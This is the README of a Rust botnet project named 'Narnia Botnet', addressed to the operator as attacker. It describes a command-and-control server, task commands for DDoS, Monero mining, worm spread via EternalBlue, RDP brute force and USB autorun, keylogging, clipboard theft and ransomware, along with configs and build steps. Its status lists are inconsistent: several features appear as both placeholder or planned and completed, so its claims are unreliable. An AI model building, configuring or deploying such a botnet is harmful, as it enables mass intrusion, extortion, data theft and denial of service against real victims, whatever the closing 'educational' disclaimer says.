# Narnia Botnet

A comprehensive botnet system written in Rust, featuring advanced evasion techniques and multiple attack modules.

## Architecture

```
                                    +-------------------+
                                    |   Attacker (You)  |
                                    |                   |
                                    |  - CLI Control    |
                                    |  - Web Panel      |
                                    |  - Task Builder   |
                                    +----------+--------+
                                               |
                                               | HTTPS / Tor
                                               |
                           +-------------------v--------------------+
                           |          C2 Server (Rust Rocket)         |
                           |                                          |
                           |  - Bot Registration / Check-in           |
                           |  - Task Distribution (DDoS, Mine, etc.) |
                           |  - Bot Management Dashboard              |
                           |  - Database (SQLite / PostgreSQL)        |
                           |  - Tor Hidden Service (.onion)           |
                           |  - DNS Fallback for Stealth              |
                           +-------------------+----------------------+
                                               |
                                               | (Encrypted Tasks + Bot ID)
                                               |
               +-------------------------------+-------------------------------+
               |                               |                               |
               v                               v                               v
   +------------------+             +------------------+             +------------------+
   |   Bot Node 1     |             |   Bot Node 2     |             |   Bot Node N     |
   | (Windows/Linux)  |             | (Windows/Linux)  |             | (Windows/Linux)  |
   +------------------+             +------------------+             +------------------+
   | - Unique Bot ID  |             | - Unique Bot ID  |             | - Unique Bot ID  |
   | - Anti-VM/EDR    |             | - Anti-VM/EDR    |             | - Anti-VM/EDR    |
   | - ETW/AMSI Bypass|             | - ETW/AMSI Bypass|             | - ETW/AMSI Bypass|
   | - Fileless Exec  |             | - Fileless Exec  |             | - Fileless Exec  |
   | - Polymorphic    |             | - Polymorphic    |             | - Polymorphic    |
   +------------------+             +------------------+             +------------------+
               |                               |                               |
               +---------------+---------------+-------------------------------+
                               |
                               v
                     +-------------------------+
                     |     Payload Modules     |
                     | (Loaded on Demand)      |
                     +-------------------------+
                     | - DDoS Engine           |
                     |   • HTTP Flood          |
                     |   • SYN Flood           |
                     |   • Slowloris           |
                     |                         |
                     | - Crypto Miner (XMR)    |
                     |   • Embedded XMRig      |
                     |   • CPU Throttling      |
                     |                         |
                     | - Worm Propagation      |
                     |   • SMB Exploit         |
                     |   • RDP Brute           |
                     |   • USB Auto-run        |
                     |   • Network Scan        |
                     |                         |
                     | - Proxy Server (SOCKS5) |
                     | - Data Exfil            |
                     |   • Keylogger           |
                     |   • Clipboard Stealer   |
                     |   • Screenshot          |
                     |                         |
                     | - Ransomware Module     |
                     |   (Optional Payload)    |
                     +-------------------------+
                               |
                               v
                     +-------------------------+
                     |   P2P Communication     |
                     | (Optional Decentralized)|
                     | - Bot-to-Bot Task Relay |
                     | - Resilience vs Takedown|
                     +-------------------------+
```

## Components

### C2 Server (`c2/`)
- **Framework**: Rocket.rs web framework
- **Database**: SQLite with rusqlite
- **Features**:
  - Bot registration and check-in
  - Task distribution system
  - Web dashboard for attacker control
  - RESTful API endpoints

### Bot Client (`bot/`)
- **Core Features**:
  - Unique bot ID generation
  - Anti-VM detection (placeholder)
  - ETW/AMSI bypass (placeholder)
  - Fileless execution (placeholder)
  - Polymorphic code (placeholder)

- **Attack Modules**:
  - **DDoS**: HTTP flood, SYN flood, Slowloris
  - **Crypto Mining**: XMRig integration
  - **Worm Propagation**: SMB exploit, RDP brute force, USB spread, network scanning
  - **Data Exfiltration**: Keylogger, clipboard stealer, screenshot
  - **Ransomware**: File encryption with ransom note

## API Endpoints

### Bot Communication
- `POST /register` - Bot registration
- `GET /checkin/<id>` - Bot check-in and task retrieval
- `POST /task` - Assign task to bot

### Dashboard
- `GET /` - Web dashboard
- `GET /bots` - List all registered bots
- `GET /tasks` - List all tasks

## Task Types

- `ddos <type> <target> <port> <threads>` - Launch DDoS attack
- `mine <wallet> <pool> <threads>` - Start crypto mining
- `spread <method> <target>` - Worm propagation
- `update <url>` - Self-update bot
- `sleep` - Idle state

## Configuration

Both the C2 server and bot client support comprehensive configuration through:

### Configuration Files
- `config/default.toml` - Default settings
- `config/c2.toml` or `config/bot.toml` - Component-specific overrides
- Environment variables with `C2_` or `BOT_` prefixes

### Environment Variables
- `.env` file support using `dotenvy`
- Environment variable overrides for all settings

### Configuration Examples

#### C2 Server Configuration
```toml
[server]
host = "0.0.0.0"
port = 443
workers = 8

[tor]
enabled = true
hidden_service_port = 443

[security]
enable_encryption = true
encryption_key = "your_32_char_key"
```

#### Bot Configuration
```toml
[c2]
primary_url = "http://c2.onion"
tor_enabled = true

[modules]
ddos_enabled = true
ransomware_enabled = false

[security]
anti_vm_enabled = true
polymorphic_enabled = false
```

## Building and Running

### C2 Server
```bash
cd c2
# Copy and edit configuration
cp .env.example .env
# Edit .env with your settings

cargo build --release
cargo run
```
Server runs on configured host:port (default `http://localhost:8000`)

### Bot Client
```bash
cd bot
# Copy and edit configuration
cp .env.example .env
# Edit .env with your settings

cargo build --release
cargo run
```

## Security Features

### Anti-Detection
- Anti-VM checks (RDTSC, CPUID, timing analysis)
- ETW (Event Tracing for Windows) bypass
- AMSI (Antimalware Scan Interface) bypass
- Fileless execution in memory
- Polymorphic code generation

### Communication Security
- Tor hidden service integration (planned)
- DNS fallback channels (planned)
- Encrypted task distribution (planned)
- P2P communication for resilience (planned)

## Attack Capabilities

### DDoS Attacks
- HTTP Flood: High-volume HTTP requests
- SYN Flood: TCP SYN packet flood
- Slowloris: Slow HTTP header attacks

### Cryptocurrency Mining
- XMRig integration for Monero mining
- Configurable wallet and pool settings
- Multi-threaded mining

### Worm Propagation
- SMB EternalBlue exploitation
- RDP brute force attacks
- USB autorun.inf infection
- Network scanning and lateral movement

### Data Exfiltration
- Windows keylogger (placeholder)
- Clipboard content stealing
- Screenshot capture
- Encrypted data transmission

### Ransomware
- AES file encryption
- .encrypted file extension
- Ransom note generation
- Bitcoin payment instructions

## Development Status

✅ **Completed**:
- C2 server with database and web dashboard
- Bot registration and task distribution
- DDoS attack modules (HTTP, SYN, Slowloris)
- Crypto mining integration (XMRig)
- Worm propagation modules (SMB, RDP, USB, network scan)
- Data exfiltration framework
- Full ransomware with AES-256-GCM encryption
- Tor hidden service integration (arti-client)
- DNS tunneling fallback
- P2P bot communication for resilience
- Full SOCKS5 proxy with tokio
- Polymorphic bot builder with code obfuscation

🔄 **In Progress**:
- Anti-VM/EDR bypass implementation
- Fileless execution
- Mobile bot (Android) - requires separate Kotlin/Java implementation

⏳ **Future Enhancements**:
- Task encryption with asymmetric crypto
- Advanced evasion techniques (AMSI bypass, ETW patching)
- Web panel with Tailwind/HTMX
- Android mobile bot
- Container-based deployment

## Legal Notice

This project is for educational and research purposes only. Unauthorized use of botnets is illegal and unethical. The authors are not responsible for any misuse of this code.
